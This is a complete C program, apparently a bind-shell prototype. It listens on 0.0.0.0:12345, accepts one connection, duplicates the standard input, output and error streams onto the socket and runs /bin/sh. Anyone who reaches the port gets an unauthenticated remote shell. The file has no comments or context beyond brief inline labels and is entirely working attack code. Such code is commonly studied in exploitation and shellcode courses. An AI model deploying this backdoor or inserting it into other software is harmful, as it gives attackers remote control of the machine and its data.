#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

// print error message
void printe(char *msg) {
    perror(msg);
    exit(0);
}

int main(int argc, char const *argv[]) {
    int listen_sock = socket(PF_INET, SOCK_STREAM, 0);
    // initialize bind's 2nd argument
    struct sockaddr_in server_addr;
    server_addr.sin_family = PF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(12345);
    // bind listen_sock to 0.0.0.0:12345
    if (bind(listen_sock, (struct sockaddr *)&server_addr,
             sizeof(server_addr)) == -1) {
        printe("Binding Error!");
    }
    // listen socket
    if (listen(listen_sock, 0) == -1) {
        printe("Not Listening!");
    }
    // create accept socket
    int conn_sock = accept(listen_sock, NULL, NULL);
    if (conn_sock == -1) {
        printe("Accept Failed!");
    }
    // dup stdin, stdout and stderr to conn_sock
    dup2(conn_sock, 2);
    dup2(conn_sock, 1);
    dup2(conn_sock, 0);
    // create shell
    execve("/bin/sh", NULL, NULL);

    return 0;
}